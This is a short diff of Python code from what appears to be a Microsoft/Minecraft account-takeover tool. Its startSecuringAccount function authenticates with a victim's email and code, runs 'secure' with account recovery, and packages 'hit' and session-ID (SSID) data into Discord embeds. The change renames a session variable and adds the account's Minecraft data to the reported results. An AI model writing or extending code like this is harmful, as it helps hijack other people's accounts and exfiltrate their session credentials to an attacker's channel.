@@ -14,10 +14,10 @@ import time
 async def startSecuringAccount(session: httpx.AsyncClient, email: str, device: str = None, code: str = None, recovery: bool = True):
     # Handles the data to be displayed in embeds to discord
     
-    fresh_session = getSession()
+    session = getSession()
     
-    data = await getLiveData(fresh_session)
-    msaauth = await getMSAAUTH(fresh_session, email, device, data, code)
+    data = await getLiveData(session)
+    msaauth = await getMSAAUTH(session, email, device, data, code)
     
     account = {
         "microsoft": {
@@ -51,8 +51,8 @@ async def startSecuringAccount(session: httpx.AsyncClient, email: str, device: s
         account["microsoft"]["email"] = "Child Locked"
         account["microsoft"]["security_email"] = "Child Locked"
     else:
-        await polishHost(fresh_session, msaauth)
-        account = await secure(fresh_session, recovery, account)
+        await polishHost(session, msaauth)
+        account = await secure(session, recovery, account)
 
     finalTime = (time.time() - initialTime)
 
@@ -114,6 +114,7 @@ async def startSecuringAccount(session: httpx.AsyncClient, email: str, device: s
 
     accountData = {
         "hit_embed": hit_embed,
+        "minecraft": account["minecraft"],
         "details": {
             "stats_embed": stats_embed,
             "ssid_embed": ssid_embed,
